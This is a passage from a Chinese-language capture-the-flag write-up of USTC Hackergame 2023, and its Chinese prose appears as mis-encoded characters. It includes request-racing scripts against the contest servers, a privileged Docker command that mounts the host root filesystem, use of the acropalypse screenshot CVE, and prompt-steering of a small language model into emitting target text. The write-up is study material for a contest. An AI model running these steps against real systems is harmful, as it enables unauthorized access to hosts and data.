</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>result</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>func</span><span class=p>.</span><span class=nx>apply</span><span class=p>(</span><span class=nx>context</span><span class=p>,</span> <span class=nx>args</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>resolve</span><span class=p>(</span><span class=nx>result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>reject</span><span class=p>(</span><span class=nx>error</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>.</span><span class=nx>isRunning</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>this</span><span class=p>.</span><span class=nx>run</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div><p>é‚£çŒœæµ‹ç›´æ¥å¿«é€Ÿå‘ä¸‹ä¸‰ä¸ªè¿èµ·æ¥çš„æ£‹ä½ç½®çš„è¯·æ±‚ï¼Œå°±èƒ½èµ¢äº†ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># convert above curl to python requests</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://202.38.93.111:10077&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># create new session</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;session&#39;</span><span class=p>:</span> <span class=s1>&#39;.eJyr...&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1># post with cookie and data {&#34;x&#34;:&#34;1&#34;,&#34;y&#34;:&#34;1&#34;}</span>
</span></span><span class=line><span class=cl><span class=c1># å‘é€çš„è¶³å¤Ÿå¿«å°±è¡Œ</span>
</span></span><span class=line><span class=cl><span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=s1>&#39;{&#34;x&#34;:&#34;0&#34;,&#34;y&#34;:&#34;1&#34;}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=s1>&#39;{&#34;x&#34;:&#34;1&#34;,&#34;y&#34;:&#34;1&#34;}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=s1>&#39;{&#34;x&#34;:&#34;2&#34;,&#34;y&#34;:&#34;1&#34;}&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># {&#34;board&#34;:[[1,-1,0],[0,-1,0],[0,-1,0]],&#34;msg&#34;:&#34;flag{I_can_eat_your_pieces_7843afed75}&#34;}</span>
</span></span></code></pre></div><h2 id=å¥¶å¥¶çš„ç¡å‰-flag-æ•…äº‹>å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹<a hidden class=anchor aria-hidden=true href=#å¥¶å¥¶çš„ç¡å‰-flag-æ•…äº‹>#</a></h2><p>é¢˜ç›®æåˆ°äº†<code>è°·æ­Œçš„ã€äº²å„¿å­ã€</code>(pixel)ï¼Œ<code>è¿ç³»ç»Ÿéƒ½æ²¡å¿ƒæ€å‡çº§</code>ï¼Œ<code>æˆªå›¾</code>ã€‚æœç´¢<code>pixel screenshot cve</code>èƒ½æœåˆ°<a href=https://nvd.nist.gov/vuln/detail/CVE-2023-35671>NVD - CVE-2023-35671 (nist.gov)</a>ï¼Œå³pixelçš„æˆªå›¾ç¨‹åºä¸ä¼šæŠŠè£å‰ªçš„éƒ¨åˆ†ä»æ•°æ®é‡Œåˆ é™¤ï¼Œæœ‰éšç§æ³„æ¼é£é™©ã€‚éšååœ¨ç½‘ä¸Šæ‰¾åˆ°äº†<a href=https://acropalypse.app/>acropalypse poc</a>çš„ç½‘é¡µå®ç°ï¼ŒæŠŠå›¾ä¼ ä¸Šå»ï¼Œè®¾ç½®é•¿å®½ä¸º1080*2400å³å¯æ¢å¤ï¼š</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/pixel_screenshot.png alt=æ¢å¤åçš„æˆªå›¾><figcaption>æ¢å¤åçš„æˆªå›¾</figcaption></figure></p><h2 id=ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨>ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨<a hidden class=anchor aria-hidden=true href=#ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨>#</a></h2><p>ç¬¬ä¸€æ¬¡è¯·æ±‚å°±ä¼šæ‹¿åˆ°è¿™1000æ¡æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œç„¶åæ ¹æ®æ¶ˆæ¯å‘å‡ºçš„delayå‘æ’¤å›çš„è¯·æ±‚å°±è¡Œï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://202.38.93.111:10021/api/getMessages&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_callback</span><span class=p>(</span><span class=n>msgid</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://202.38.93.111:10021/api/deleteMessage&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>headers</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span> <span class=s1>&#39;application/json&#39;</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;id&#39;</span><span class=p>:</span> <span class=n>msgid</span><span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=n>headers</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>data</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># print resp</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=c1># create new request session</span>
</span></span><span class=line><span class=cl><span class=n>session</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>Session</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>response</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># dump to json</span>
</span></span><span class=line><span class=cl><span class=n>resp_json</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>item_id</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>resp_json</span><span class=p>[</span><span class=s1>&#39;messages&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>    <span class=c1># è®¡ç®—è‡ªä¸Šä¸€ä¸ªæ¡ç›®ä»¥æ¥å·²ç»è¿‡å»çš„æ—¶é—´</span>
</span></span><span class=line><span class=cl>    <span class=n>elapsed_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span> <span class=o>-</span> <span class=n>start_time</span>
</span></span><span class=line><span class=cl>    <span class=c1># è®¡ç®—è¿˜éœ€è¦ç­‰å¾…å¤šé•¿æ—¶é—´</span>
</span></span><span class=line><span class=cl>    <span class=n>delay</span> <span class=o>=</span> <span class=n>item</span><span class=p>[</span><span class=s1>&#39;delay&#39;</span><span class=p>]</span> <span class=o>-</span> <span class=n>elapsed_time</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>delay</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>delay</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=n>item</span><span class=p>[</span><span class=s1>&#39;text&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;hack\[([a-zA-Z]*)\]&#39;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>delay</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># id is the index of the message</span>
</span></span><span class=line><span class=cl>        <span class=nb>id</span> <span class=o>=</span> <span class=n>item_id</span>
</span></span><span class=line><span class=cl>        <span class=n>send_callback</span><span class=p>(</span><span class=nb>id</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>item_id</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># sleep 3 seconds</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag_resp</span> <span class=o>=</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=s1>&#39;http://202.38.93.111:10021/api/getflag&#39;</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag_resp</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#{&#34;flag&#34;:&#34;flag{Web_pr0gra_mm1ng_9386f773ee_15fun}&#34;,&#34;success&#34;:true}</span>
</span></span></code></pre></div><h2 id=è™«>è™«<a hidden class=anchor aria-hidden=true href=#è™«>#</a></h2><p>å¬èµ·æ¥å¾ˆåƒæ˜¯è§£SSTVçš„é¢˜ç›®ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†<a href=https://github.com/colaclanth/sstv.git>https://github.com/colaclanth/sstv.git</a>ç›´æ¥è½¬æ¢å°±èƒ½è§£å‡ºäº†ï¼š</p><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/result-sstv.png alt=result-sstv><figcaption>result-sstv</figcaption></figure></p><h2 id=json--yaml>JSON âŠ‚ YAML?<a hidden class=anchor aria-hidden=true href=#json--yaml>#</a></h2><h3 id=json--yaml-11>JSON âŠ„ YAML 1.1<a hidden class=anchor aria-hidden=true href=#json--yaml-11>#</a></h3><p>åœ¨<a href=https://stackoverflow.com/questions/21584985/what-valid-json-files-are-not-valid-yaml-1-1-files>What valid JSON files are not valid YAML 1.1 files? - Stack Overflow</a>æ‰¾åˆ°äº†<code>12345e999</code>ã€‚</p><h3 id=json--yaml-12>JSON âŠ„ YAML 1.2<a hidden class=anchor aria-hidden=true href=#json--yaml-12>#</a></h3><p>ç¿»åˆ°äº†<a href="https://news.ycombinator.com/item?id=30052128">I accidentally used YAML.parse instead of JSON.parse and it worked | Hacker News (ycombinator.com)</a>å’Œ<a href=https://yaml.org/spec/1.2-old/spec.html#id2759572>YAML Ainâ€™t Markup Language (YAMLâ„¢) Version 1.2</a>ï¼Œä»–ä»¬æåˆ°äº†ï¼š</p><blockquote><p>JSON&rsquo;s <a href=http://www.ietf.org/rfc/rfc4627.txt>RFC4627</a> requires that <a href=https://yaml.org/spec/1.2-old/spec.html#mapping//>mappings</a> <a href=https://yaml.org/spec/1.2-old/spec.html#key//>keys</a> merely â€œSHOULDâ€ be <a href=https://yaml.org/spec/1.2-old/spec.html#equality//>unique</a>, while YAML insists they â€œMUSTâ€ be. Technically, YAML therefore complies with the JSON spec, choosing to treat duplicates as an error. In practice, since JSON is silent on the semantics of such duplicates, the only portable JSON files are those with unique keys, which are therefore valid YAML files.</p></blockquote><p>é‚£æ„é€ ä¸€ä¸ªæœ‰ä¸¤ä¸ªä¸€æ ·çš„keyçš„jsonå°±è¡Œï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;a&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>,</span><span class=nt>&#34;a&#34;</span><span class=p>:</span> <span class=mi>1</span><span class=p>}</span>
</span></span></code></pre></div><h2 id=git-git>Git? Git!<a hidden class=anchor aria-hidden=true href=#git-git>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=c1># git reflog</span>
</span></span><span class=line><span class=cl>ea49f0c <span class=o>(</span>HEAD -&gt; main<span class=o>)</span> HEAD@<span class=o>{</span>0<span class=o>}</span>: commit: Trim trailing spaces
</span></span><span class=line><span class=cl>15fd0a1 <span class=o>(</span>origin/main, origin/HEAD<span class=o>)</span> HEAD@<span class=o>{</span>1<span class=o>}</span>: reset: moving to HEAD~
</span></span><span class=line><span class=cl>505e1a3 HEAD@<span class=o>{</span>2<span class=o>}</span>: commit: Trim trailing spaces
</span></span><span class=line><span class=cl>15fd0a1 <span class=o>(</span>origin/main, origin/HEAD<span class=o>)</span> HEAD@<span class=o>{</span>3<span class=o>}</span>: clone: from https://github.com/dair-ai/ML-Course-Notes.git
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># git reset --hard 505e1a3</span>
</span></span></code></pre></div><p>ä¸€ä¸ªä¸€ä¸ªæ‰¾å°±èƒ½çœ‹åˆ°README.mdé‡Œæœ‰<code> &lt;!-- flag{TheRe5_@lwAy5_a_R3GreT_pi1l_1n_G1t} --></code>äº†</p><h2 id=http-é›†é‚®å†Œ>HTTP é›†é‚®å†Œ<a hidden class=anchor aria-hidden=true href=#http-é›†é‚®å†Œ>#</a></h2><pre tabindex=0><code>[100, 200, 206, 304, 400, 404, 405, 412, 413, 414, 416, 505]
</code></pre><h3 id=æ²¡æœ‰çŠ¶æ€å“ˆéé¢„æœŸ>æ²¡æœ‰çŠ¶æ€â€¦â€¦å“ˆï¼Ÿï¼ˆéé¢„æœŸï¼‰<a hidden class=anchor aria-hidden=true href=#æ²¡æœ‰çŠ¶æ€å“ˆéé¢„æœŸ>#</a></h3><p>ç”¨CONNECT/TRACEä¼¼ä¹éƒ½å¯ä»¥åšåˆ°ï¼ˆåšçš„æ—¶å€™æƒ³èµ·æ¥äº†â€œHTTPä»£ç†â€ï¼‰</p><pre tabindex=0><code>CONNECT / \r\nHost: a.com\r\n\r\n
</code></pre><h3 id=512-ç§çŠ¶æ€ç >5/12 ç§çŠ¶æ€ç <a hidden class=anchor aria-hidden=true href=#512-ç§çŠ¶æ€ç >#</a></h3><h4 id=100-continue><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/100><code>100 Continue</code></a><a hidden class=anchor aria-hidden=true href=#100-continue>#</a></h4><pre tabindex=0><code>GET / HTTP/1.1\r\n
Expect: 100-continue\r\n
Host: example.com\r\n\r\n
</code></pre><h4 id=200-ok><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/200><code>200 OK</code></a><a hidden class=anchor aria-hidden=true href=#200-ok>#</a></h4><pre tabindex=0><code>GET / HTTP/1.1\r\n
Host: example.com\r\n\r\n
</code></pre><h4 id=206-partial-content><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/206><code>206 Partial Content</code></a><a hidden class=anchor aria-hidden=true href=#206-partial-content>#</a></h4><p>è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„éƒ¨åˆ†åŒºé—´</p><pre tabindex=0><code>GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=1-2\r\n
Connection: close\r\n\r\n
</code></pre><h4 id=304-not-modified><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/304><code>304 Not Modified</code></a><a hidden class=anchor aria-hidden=true href=#304-not-modified>#</a></h4><p>è‡ªæŸä¸ªetagåæ²¡æœ‰ä¿®æ”¹è¿‡</p><pre tabindex=0><code>GET / HTTP/1.1\r\n
Host: example.com\r\n
If-None-Match: &#34;64dbafc8-267&#34;\r\n
Connection: close\r\n\r\n
</code></pre><h4 id=400-bad-request><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/400><code>400 Bad Request</code></a><a hidden class=anchor aria-hidden=true href=#400-bad-request>#</a></h4><p>HTTPæ¢æˆä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿å°±è¡Œ</p><pre tabindex=0><code>GET / FOO/1.1\r\n
Host: example.com\r\n
Connection: close\r\n\r\n
</code></pre><h4 id=404-not-found><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/404><code>404 Not Found</code></a><a hidden class=anchor aria-hidden=true href=#404-not-found>#</a></h4><pre tabindex=0><code>GET /notexist HTTP/1.1\r\n
Host: example.com\r\n\r\n
</code></pre><h4 id=405-method-not-allowed><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/405><code>405 Method Not Allowed</code></a><a hidden class=anchor aria-hidden=true href=#405-method-not-allowed>#</a></h4><p>åœ¨ä¸æ”¯æŒPOSTçš„åœ°æ–¹POST</p><pre tabindex=0><code>POST / HTTP/1.1\r\n
Host: example.com\r\n
Connection: close\r\n\r\n
</code></pre><h4 id=412-precondition-failed><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/412><code>412 Precondition Failed</code></a><a hidden class=anchor aria-hidden=true href=#412-precondition-failed>#</a></h4><p>å’Œ304ç±»ä¼¼ï¼Œä½†æ—¶é—´å–ä¸€ä¸ªå¾ˆä¹…ä»¥å‰ï¼ˆæ–‡ä»¶åˆ›å»ºä¹‹å‰ï¼‰çš„æ—¶é—´</p><pre tabindex=0><code>GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
If-Unmodified-Since: Sun, 15 Apr 2018 20:00:00 GMT\r\n\r\n
</code></pre><h4 id=413-payload-too-large><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/413><code>413 Payload Too Large</code></a><a hidden class=anchor aria-hidden=true href=#413-payload-too-large>#</a></h4><p>è®¾ç½®ä¸€ä¸ªè¿‡é•¿çš„<code>Content-Length</code></p><pre tabindex=0><code>GET / HTTP/1.1\r\n
Content-Length: 10000000000\r\n
Host: example.com\r\n\r\n
</code></pre><h4 id=414-uri-too-long><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/414><code>414 URI Too Long</code></a><a hidden class=anchor aria-hidden=true href=#414-uri-too-long>#</a></h4><p>è®¾ç½®ä¸€ä¸ªè¿‡é•¿çš„URLï¼ˆåœ¨é»˜è®¤é…ç½®é‡Œæ˜¯å¤§äº8192å­—èŠ‚çš„æ ·å­ï¼‰</p><pre tabindex=0><code>GET /long-url-over-8000-words/ HTTP/1.1\r\n
Host: example.com\r\n\r\n
</code></pre><h4 id=416-range-not-satisfiable><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/416><code>416 Range Not Satisfiable</code></a><a hidden class=anchor aria-hidden=true href=#416-range-not-satisfiable>#</a></h4><p>å’Œ206ç±»ä¼¼ï¼Œä½†å–ä¸€ä¸ªä¸å­˜åœ¨çš„range</p><pre tabindex=0><code>GET / HTTP/1.1\r\n
Host: example.com\r\n
Range: bytes=999-9999\r\n
Connection: close\r\n\r\n
</code></pre><h4 id=505-http-version-not-supported><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/505><code>505 HTTP Version Not Supported</code></a><a hidden class=anchor aria-hidden=true href=#505-http-version-not-supported>#</a></h4><p>å‘æœåŠ¡å™¨ä¸è®¤è¯†çš„httpç‰ˆæœ¬</p><pre tabindex=0><code>GET / HTTP/114514\r\n
Host: example.com\r\n
Connection: close\r\n\r\n
</code></pre><h2 id=docker-for-everyone>Docker for Everyone<a hidden class=anchor aria-hidden=true href=#docker-for-everyone>#</a></h2><p>ç”¨<code>--privileged</code>å¯åŠ¨dockerå¹¶æŠŠæ ¹ç›®å½•æŒ‚è¿›dockeræ‰¾å°±å¯ä»¥äº†ï¼š</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>docker run -it -v /:/host-root â€”-privileged alpine
</span></span></code></pre></div><p><figure><img loading=lazy src=https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/docker-mount.png alt=æŒ‚è½½æ ¹ç›®å½•><figcaption>æŒ‚è½½æ ¹ç›®å½•</figcaption></figure></p><h2 id=æƒœå­—å¦‚é‡‘-20>æƒœå­—å¦‚é‡‘ 2.0<a hidden class=anchor aria-hidden=true href=#æƒœå­—å¦‚é‡‘-20>#</a></h2><p>ç”Ÿæˆ<code>cod_dict</code>çš„é‚£éƒ¨ä»½æ¯è¡Œåªæœ‰23ä¸ªcharï¼Œé‚£ç†è®ºä¸Šæ¯è¡Œåªè¦åŠ ä¸€ä¸ªcharå°±è¡Œäº†ï¼Œç„¶åç¡¬å‡‘å°±å¯ä»¥ï¼ˆå¯ä»¥é€šè¿‡å‰é¢çš„<code>flag{</code>å’Œåé¢çš„<code>}</code>å·æ¥å¯»æ‰¾ç¼ºçš„éƒ¨åˆ†å¤§æ¦‚åº”è¯¥æ’å…¥åœ¨ä»€ä¹ˆä½ç½®ã€‚</p><h2 id=é«˜é¢‘ç‡æ˜Ÿçƒ>é«˜é¢‘ç‡æ˜Ÿçƒ<a hidden class=anchor aria-hidden=true href=#é«˜é¢‘ç‡æ˜Ÿçƒ>#</a></h2><p>å…ˆæŠŠasciinemaçš„å½•åˆ¶æ–‡ä»¶è¾“å‡ºåˆ°æ–‡æœ¬ï¼Œç„¶åæ›¿æ¢æ‰é‚£äº›é‡å å’Œçœ‹èµ·æ¥åƒæ˜¯ä¹±ç çš„éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨jsæ£€æŸ¥å™¨æ£€æŸ¥ä¸€ä¸‹ï¼ˆæˆ–è€…ç”¨asciinemaå½•åˆ¶æœ€å¼€å¤´çš„æ—¶å€™æåˆ°çš„sha256ï¼‰</p><pre tabindex=0><code>asciinema  play /Users/cyf/Downloads/hackergame-23/asciinema_restore.rec  &gt; output.txt
</code></pre><p>æ£€æŸ¥å¥½äº†è¿è¡Œjså³å¯ï¼š</p><pre tabindex=0><code>#node op.js
flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371}
</code></pre><h2 id=å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ>å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ<a hidden class=anchor aria-hidden=true href=#å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ>#</a></h2><h3 id=you-are-smart>You Are Smart<a hidden class=anchor aria-hidden=true href=#you-are-smart>#</a></h3><pre tabindex=0><code># input
John likes to repeat what other saying. One day, Julia says &#34;you are smart&#34; to john, and John replied:
</code></pre><pre tabindex=0><code># reply
&#34;you are smart, too&#34;. They both laugh and hug each other.

John and Julia have been playing together all day, and they are
ğŸ‘ğŸ‘ğŸ‘ flag1: flag{I-thINk-yOU-@rE-rEaLlY-rE4L1Y-Sm@RT} ğŸ‘ğŸ‘ğŸ‘
</code></pre><h3 id=accepted>Accepted<a hidden class=anchor aria-hidden=true href=#accepted>#</a></h3><p>ä»<a href=https://huggingface.co/datasets/roneneldan/TinyStories/blob/main/TinyStories-train.txt>TinyStories-train.txt Â· roneneldan/TinyStories at main (huggingface.co)</a>ä¸‹è½½ä¸€ä¸‹trainçš„è®­ç»ƒé›†ï¼Œç„¶ååœ¨è®­ç»ƒé›†é‡Œæ‰¾å‡º<code>accepted</code>å‰é¢çš„8ä¸ªcharï¼Œä¸€ä¸ªä¸€ä¸ªè¾“å…¥æ¨¡å‹è¯•ã€‚</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>transformers</span> <span class=kn>import</span> <span class=n>AutoModelForCausalLM</span><span class=p>,</span> <span class=n>AutoTokenizer</span><span class=p>,</span> <span class=n>GenerationConfig</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>torch</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pickle</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tqdm.notebook</span> <span class=kn>import</span> <span class=n>trange</span><span class=p>,</span> <span class=n>tqdm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>device</span> <span class=o>=</span> <span class=s2>&#34;cuda:0&#34;</span> <span class=k>if</span> <span class=n>torch</span><span class=o>.</span><span class=n>cuda</span><span class=o>.</span><span class=n>is_available</span><span class=p>()</span> <span class=k>else</span> <span class=s2>&#34;cpu&#34;</span>
</span></span><span class=line><span class=cl><span class=n>model</span> <span class=o>=</span> <span class=n>AutoModelForCausalLM</span><span class=o>.</span><span class=n>from_pretrained</span><span class=p>(</span><span class=s1>&#39;./TinyStories-33M&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>model</span> <span class=o>=</span> <span class=n>model</span><span class=o>.</span><span class=n>to</span><span class=p>(</span><span class=n>device</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>tokenizer</span> <span class=o>=</span> <span class=n>AutoTokenizer</span><span class=o>.</span><span class=n>from_pretrained</span><span class=p>(</span><span class=s2>&#34;./TinyStories-33M&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># load counts_lst.pkl</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./counts_lst.pkl&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>counts_lst</span> <span class=o>=</span> <span class=n>pickle</span><span class=o>.</span><span class=n>load</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>trange</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>counts_lst</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>    <span class=n>prompt</span> <span class=o>=</span> <span class=n>counts_lst</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>0</span><span class=p>][</span><span class=mi>0</span><span class=p>:</span><span class=mi>7</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>input_ids</span> <span class=o>=</span> <span class=n>tokenizer</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=n>prompt</span><span class=p>,</span> <span class=n>return_tensors</span><span class=o>=</span><span class=s2>&#34;pt&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>to</span><span class=p>(</span><span class=n>device</span><span class=p>)</span>
